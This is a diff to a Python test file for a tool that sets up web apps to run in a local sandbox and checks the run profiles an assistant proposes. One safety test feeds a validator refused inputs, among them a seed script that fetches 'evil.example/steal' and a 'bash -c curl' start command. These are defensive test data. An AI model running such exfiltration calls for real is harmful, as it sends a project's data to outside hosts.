@@ -8,6 +8,7 @@ import unittest
 from pathlib import Path
 from unittest import mock
 
+from needs import need
 from eaos.live.app import assist as live_assist, setup as live_setup, profile as run_profile
 from eaos.live.app.run import LiveRun, load_profile
 from eaos.live.isolation.sandbox import AuthorizationError
@@ -23,22 +24,17 @@ def project(files):
 
 
 VITE_APP = {
-    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build', 'start': 'node server.js',
-                                                     'lint': 'eslint .', 'test': 'vitest run', 'typecheck': 'tsc --noEmit',
+    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build',
+                                                     'start': 'node server.js', 'lint': 'eslint .',
+                                                     'test': 'vitest run', 'typecheck': 'tsc --noEmit',
                                                      'deploy': 'railway up', 'migrate': 'node migrate.js'},
                          'dependencies': {'react': '18', 'pg': '8'}, 'devDependencies': {'vite': '5'}},
     'app/package-lock.json': '{}',
-    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\nLOG_LEVEL=info\nFEATURE_X=true\n',
+    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\n'
+                        'LOG_LEVEL=info\nFEATURE_X=true\n',
     'app/.env': 'SESSION_SECRET=the-real-production-secret\n',
     'app/src/main.ts': 'const u = import.meta.env.VITE_API_URL; const m = process.env.MAIL_TOKEN;\n',
 }
-
-K6 = """export const options = {
-  scenarios: { load: { executor: 'ramping-vus', startVUs: 0, stages: [
-    { duration: '1m', target: 100 }, { duration: '3m', target: 100 }, { duration: '1m', target: 0 } ] } },
-  thresholds: { http_req_duration: ['p(95)<800'], http_req_failed: ['rate<0.01'] },
-};
-"""
 
 
 def bare_run(**fields):
@@ -55,7 +51,8 @@ class DetectTests(unittest.TestCase):
         self.assertEqual(profile['install'], [['npm', 'ci', '--no-audit', '--no-fund']])
         self.assertEqual(profile['start'][:2], ['npx', 'vite'])
         self.assertIn('127.0.0.1', profile['start'])
-        self.assertEqual(profile['checks'], [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
+        self.assertEqual(profile['checks'],
+                         [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
         self.assertEqual(profile['database'], {'kind': 'postgres', 'name': profile['database']['name']})
         self.assertEqual(profile['prepare'], [['npm', 'run', 'migrate']])
         self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build']])
@@ -63,7 +60,8 @@ class DetectTests(unittest.TestCase):
         self.assertEqual(env['DATABASE_URL'], '{database_url}')
         self.assertNotEqual(env['SESSION_SECRET'], 'the-real-production-secret')
         self.assertGreater(len(env['SESSION_SECRET']), 30)
-        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9', 'a hosted service becomes an address nobody answers')
+        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9',
+                         'a hosted service becomes an address nobody answers')
         self.assertEqual((env['LOG_LEVEL'], env['FEATURE_X']), ('info', 'true'))
         self.assertIn('VITE_API_URL', env)
         self.assertIn('MAIL_TOKEN', env)
@@ -75,46 +73,50 @@ class DetectTests(unittest.TestCase):
             self.assertEqual(live_setup.script_is_safe(scripts, name), safe, name)
         found = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vercel dev', 'start': 'node s.js'}}}))
         self.assertEqual(found['profile']['start'], ['npm', 'run', 'start'])
-        pnpm = project({'package.json': {'scripts': {'dev': 'vite', 'lint': 'eslint .'}, 'devDependencies': {'vite': '5'}},
+        pnpm = project({'package.json': {'scripts': {'dev': 'vite', 'lint': 'eslint .'},
+                                         'devDependencies': {'vite': '5'}},
                         'pnpm-lock.yaml': 'lockfileVersion: 9\n'})
         with mock.patch('shutil.which', side_effect=lambda name: None if name == 'pnpm' else f'/usr/bin/{name}'):
             profile = live_setup.detect(pnpm)['profile']
-        self.assertEqual(profile['install'], [['corepack', 'pnpm', 'install', '--frozen-lockfile', '--config.strict-dep-builds=false']])
+        self.assertEqual(profile['install'], [['corepack', 'pnpm', 'install', '--frozen-lockfile',
+                                               '--config.strict-dep-builds=false']])
         self.assertEqual(profile['checks'], [['corepack', 'pnpm', 'run', 'lint']])
-        # a Python app is no reason to give up (EAOS itself was skipped so, with an earlier app's profile kept): a draft
-        # that starts nothing, which the assistant completes from the project's documentation
+        # a Python app is no reason to give up: the draft starts nothing, and the assistant completes it from the
+        # project's documentation
         python = live_setup.detect(project({'main.py': 'print(1)\n'}))
-        self.assertEqual((python['profile']['start'], python['profile']['app'], python['limitations']), (['true'], '.', []))
-        supabase = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '5'},
+        self.assertEqual((python['profile']['start'], python['profile']['app'], python['limitations']),
+                         (['true'], '.', []))
+        supabase = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'},
+                                                               'devDependencies': {'vite': '5'},
                                                                'dependencies': {'@supabase/supabase-js': '2'}}}))
         self.assertTrue(any('Supabase' in l for l in supabase['limitations']))
 
-    def test_the_load_baseline_never_runs_the_dev_server_and_reads_its_conditions_from_the_scenario(self):
-        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'}, 'devDependencies': {'vite': '5'}}
+    def test_the_production_build_never_runs_the_dev_server(self):
+        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'},
+                     'devDependencies': {'vite': '5'}}
         _, start = live_setup.production_commands('npm', dev_start, 4000)
         self.assertEqual(start[:3], ['npx', 'vite', 'preview'])
         self.assertEqual(live_setup.production_commands('npm', {'scripts': {'dev': 'node x'}}, 4000), (None, None))
-        # a plain Node server has no build step: it is its own production (its speed was never measured)
-        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'start': 'node server.js'}}, 4000), ([], ['npm', 'run', 'start']))
-        from eaos.live.trials.load_baseline import shape
-        script = Path(scratch()) / 'qs-001.js'
-        script.write_text(K6)
-        self.assertEqual(shape(script), ({'p95_ms': 800.0, 'error_rate': 0.01}, 100, 300, 60))
+        # a plain Node server has no build step: it is its own production
+        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'start': 'node server.js'}}, 4000),
+                         ([], ['npm', 'run', 'start']))
 
 
 class ProposalTests(unittest.TestCase):
     def test_an_address_off_this_computer_or_a_deploy_is_refused(self):
         self.assertEqual(run_profile.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
-                                          'start': ['npx', 'vite'], 'seed_script': "fetch('http://localhost:3000/x')"}), [])
+                                           'start': ['npx', 'vite'],
+                                           'seed_script': "fetch('http://localhost:3000/x')"}), [])
         refused = run_profile.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
-                                   'prepare': [['npx', 'vercel', 'deploy']], 'seed_script': "fetch('https://evil.example/steal')"})
+                                   'prepare': [['npx', 'vercel', 'deploy']],
+                                   'seed_script': "fetch('https://evil.example/steal')"})
         self.assertEqual(len(refused), 4)
         for words in ('api.example.com', 'bash -c', 'vercel deploy', 'evil.example'):
             self.assertTrue(any(words in reason for reason in refused), words)
         self.assertEqual(run_profile.safe({'install': [['corepack', 'pnpm', 'install']]}), [])
 
     def test_a_go_app_runs_on_the_computers_go_and_its_module_cache_goes_with_the_run(self):
-        # A Go API's assistant proposed `go mod download` and `go run .`: both were refused, and the prompt never named go.
+        # A Go API's proposals `go mod download` and `go run .` are safe, and the prompt names go.
         self.assertEqual(run_profile.safe({'install': [['go', 'mod', 'download']], 'start': ['go', 'run', '.']}), [])
         from eaos.live.app.assist import ASSIST_SYSTEM
         self.assertIn(run_profile.SAID, ASSIST_SYSTEM)
@@ -125,15 +127,19 @@ class ProposalTests(unittest.TestCase):
 
     def test_a_proposal_replaces_the_environment_and_a_production_one_changes_the_baseline_only(self):
         runtime = Path(scratch())
-        run_profile.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
-                                           'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
-                                           'prepare': [['npm', 'run', 'migrate']], 'database': {'kind': 'postgres', 'name': 'x'},
-                                           'baseline': {'build': [['npm', 'run', 'build']], 'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
-        # EAOS on itself (2026-10-14): no proposal could say where the app keeps its language, so every screen of every
-        # project was pictured in one language only
-        profile = run_profile.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
-                                             'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)',
-                                             'screens': {'lang_key': 'eaos.report.studio', 'lang_field': 'lang', 'shell': 'rm'}})
+        run_profile.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']],
+                                            'start': ['npx', 'vite'], 'port': 1,
+                                            'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
+                                            'prepare': [['npm', 'run', 'migrate']],
+                                            'database': {'kind': 'postgres', 'name': 'x'},
+                                            'baseline': {'build': [['npm', 'run', 'build']],
+                                                         'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
+        # A proposal can say where the app keeps its language, so screens are pictured in more than one language.
+        profile = run_profile.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'},
+                                              'prepare': [], 'database': 'none',
+                                              'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)',
+                                              'screens': {'lang_key': 'eaos.report.studio', 'lang_field': 'lang',
+                                                          'shell': 'rm'}})
         self.assertEqual(profile['screens'], {'lang_key': 'eaos.report.studio', 'lang_field': 'lang'})
         self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'})
         self.assertNotIn('prepare', profile)
@@ -141,19 +147,25 @@ class ProposalTests(unittest.TestCase):
         self.assertEqual(profile['seed'][0][0], 'node')
         self.assertTrue((runtime / 'setup/seed.cjs').is_file())
         self.assertEqual(oct((runtime / 'run.json').stat().st_mode & 0o777), '0o600')
-        profile = run_profile.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
-                                             'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'}, mode='baseline')
+        profile = run_profile.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5',
+                                                      'DATABASE_URL': '{database_url}'},
+                                              'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'},
+                                    mode='baseline')
         self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'}, 'the lock run is untouched')
-        self.assertEqual(profile['baseline']['env'], {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
+        self.assertEqual(profile['baseline']['env'],
+                         {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
         self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build:server']])
         with mock.patch('eaos.live.app.run.Sandbox'), mock.patch('eaos.live.app.run.head', return_value='c'):
-            self.assertEqual(LiveRun('p', runtime, 'S05', mode='baseline').profile['seed'], [], 'the load test signs nobody in')
+            self.assertEqual(LiveRun('p', runtime, 'S05', mode='baseline').profile['seed'], [],
+                             'the load test signs nobody in')
             self.assertEqual(LiveRun('p', runtime, 'S05').profile['seed'][0][0], 'node')
 
 
 class VerifyTests(unittest.TestCase):
-    def test_a_stuck_page_is_no_working_app_the_assistant_is_asked_until_it_works_and_the_project_is_never_written(self):
-        page = {'text': 'Where are you working?', 'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
+    def test_a_stuck_page_is_no_working_app_the_assistant_is_asked_until_it_works_and_the_project_is_never_written(
+            self):
+        page = {'text': 'Where are you working?',
+                'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
         self.assertTrue(live_setup.stuck(page))
         page['others'][1]['text'] = 'People with access'
         self.assertFalse(live_setup.stuck(page))
@@ -194,8 +206,8 @@ class VerifyTests(unittest.TestCase):
         self.assertEqual((profile['baseline']['verified'], profile['baseline']['env']), (True, {'APP_URL': 'https://127.0.0.1:5'}))
 
     def test_the_session_is_tried_on_a_server_apps_pages_never_on_its_sign_in_or_sign_out(self):
-        # an Express app's pages are `GET /notes`: left out, only its public first page was tried and an empty session
-        # passed for a signed-in one, so the person was never asked and every screen showed the sign-in page
+        # an Express app's pages are `GET /notes`: they are not left out, or only its public first page is tried and an
+        # empty session passes for a signed-in one
         report = Path(scratch())
         (report / 'behavior-lock').mkdir()
         (report / 'behavior-lock/plan.json').write_text(json.dumps({'specs': [{'surfaces': [
@@ -203,7 +215,7 @@ class VerifyTests(unittest.TestCase):
         self.assertEqual(live_setup.routes(report), ['/notes', '/settings'])
 
     def test_an_empty_no_data_page_is_no_working_app_and_eaos_own_studio_runs_on_its_report_in_its_own_theme(self):
-        # Diagnosis 3 §4: the Studio started without STUDIO_DATA, showed "no report here yet", and was taken as working
+        # a front end started without STUDIO_DATA shows "no report here yet" and is not taken as working
         studio = {'studio/package.json': {'scripts': {'dev': 'vite'}, 'devDependencies': {'vite': '8'}},
                   'studio/vite.config.ts': '// In development: STUDIO_DATA=/path/to/report/studio npm run dev\n'
                                            'const folder = process.env.STUDIO_DATA\n',
@@ -217,7 +229,7 @@ class VerifyTests(unittest.TestCase):
         self.assertEqual(live_setup.empty_state({'text': 'Problems: 12 open, 3 waiting for you'}, ['STUDIO_DATA']), '')
         rich = {'text': 'Command center ' + 'What needs a decision now. ' * 10 + 'No new cases or requests. No customer activity yet.'}
         self.assertEqual(live_setup.empty_state(rich, ['CLIENT_DIR']), '', "the full-stack app's command center: a full page is the app")
-        # The corpus's task-api: an API answers JSON on its first page, which is no empty screen
+        # an API answers JSON on its first page, which is no empty screen
         self.assertEqual(live_setup.empty_state({'text': '{"ok":true}'}, ['LLM_MODEL']), '')
         report = Path(scratch())
         (report / 'studio').mkdir()
@@ -253,7 +265,7 @@ class VerifyTests(unittest.TestCase):
 
 
     def test_pages_failing_for_a_database_the_run_cannot_give_are_evidence_while_another_page_answers(self):
-        # The corpus's next-dashboard (Neon's driver): its first page answered 500, its sign-in page 200
+        # an app whose first page answers 500 and whose sign-in page answers 200
         page = {'path': '/', 'status': 500, 'others': [{'path': '/login', 'status': 200}], 'errors': ['db']}
         self.assertEqual(live_setup._failure(page, '', out_of_reach=True), '')
         self.assertIn('/ answered 500', live_setup._failure(page, ''), 'a local database the run gives: a 500 is to fix')
@@ -264,7 +276,8 @@ class VerifyTests(unittest.TestCase):
         self.assertIn('answered', live_setup._failure(missing, '', out_of_reach=True), 'a page not found is no database error')
 
     def test_an_api_without_a_home_page_runs_when_one_of_its_known_routes_answers(self):
-        # A real Gin API: / answered 404 while its routes answered, and the setup recorded that the app did not run.
+        # An API whose / answers 404 while its routes answer is running: the setup must not record that the app did not
+        # run.
         page = {'path': '/', 'status': 404, 'text': '404 page not found', 'others': [
             {'path': '/api/articles', 'status': 200, 'text': '{"articles":[]}'}, {'path': '/api/user', 'status': 401, 'text': ''},
             {'path': '/api/users/login', 'status': 422, 'text': '{"errors":{}}'}]}
@@ -284,7 +297,7 @@ class VerifyTests(unittest.TestCase):
         self.assertEqual(probe.call_count, 1, 'a database the run gives: nothing more is opened')
 
     def test_the_probe_opens_the_lock_s_screens_before_its_server_paths(self):
-        # The detection baseline: four API paths filled the probe, and #/account, which draws the sign-in form, was missed
+        # Four API paths must not fill the probe and leave out #/account, which draws the sign-in form
         report = Path(scratch())
         (report / 'behavior-lock').mkdir()
         (report / 'behavior-lock/plan.json').write_text(json.dumps({'specs': [{'surfaces': [
@@ -317,7 +330,7 @@ class RunEnvironmentTests(unittest.TestCase):
 
     def test_a_database_of_the_runs_own_on_loopback_even_deep_in_a_home_and_gone_once_its_runtime_is(self):
         from eaos.core.system.local_db import LocalPostgres, binaries
-        if binaries() is None: self.skipTest('no PostgreSQL binaries')
+        need(self, 'no PostgreSQL binaries' if binaries() is None else '')
         holder = tempfile.TemporaryDirectory()
         deep = Path(holder.name) / ('.eaos/projects/chief-fellow-ops-spec-2b5adcc3/' + 'runtime/' * 6)
         db = LocalPostgres(deep)
@@ -338,9 +351,9 @@ class RunEnvironmentTests(unittest.TestCase):
         later._sweep(binaries())                               # nothing of this test stays behind
 
     def test_a_run_leaving_the_database_never_stops_it_under_another_run(self):
-        # the project's tests stopped the server when they ended, under the app the page stages were opening
+        # the project's tests must not stop the server when they end, under the app the page stages are opening
         from eaos.core.system.local_db import LocalPostgres, binaries
-        if binaries() is None: self.skipTest('no PostgreSQL binaries')
+        need(self, 'no PostgreSQL binaries' if binaries() is None else '')
         with tempfile.TemporaryDirectory() as runtime:
             pages, tests = LocalPostgres(runtime), LocalPostgres(runtime)
             try:
@@ -360,12 +373,12 @@ if __name__ == '__main__':
 
 class HashRouteProbeTests(unittest.TestCase):
     def test_the_setup_probe_counts_a_hash_route_drawn_in_the_loaded_page_as_answering(self):
-        # 0.0.15 found EAOS's Studio routes (/#/system...): the probe read the null answer of a same-page navigation as
-        # status 0, so the app "did not start" and every live stage of the check stood still.
+        # A same-page navigation (/#/system...) gives a null answer; the probe must not read it as status 0, or the app
+        # "did not start" and every live stage of the check stands still.
         import http.server, subprocess, threading, functools
         from eaos.live.screens import audit
         from eaos.core.toolchain import browsers, home
-        if audit.missing('playwright'): self.skipTest(audit.missing('playwright'))
+        need(self, audit.missing('playwright'))
         with tempfile.TemporaryDirectory() as folder:
             Path(folder, 'index.html').write_text(
                 '<body><p id="o"></p><script>const draw = () => { document.getElementById("o").textContent = '
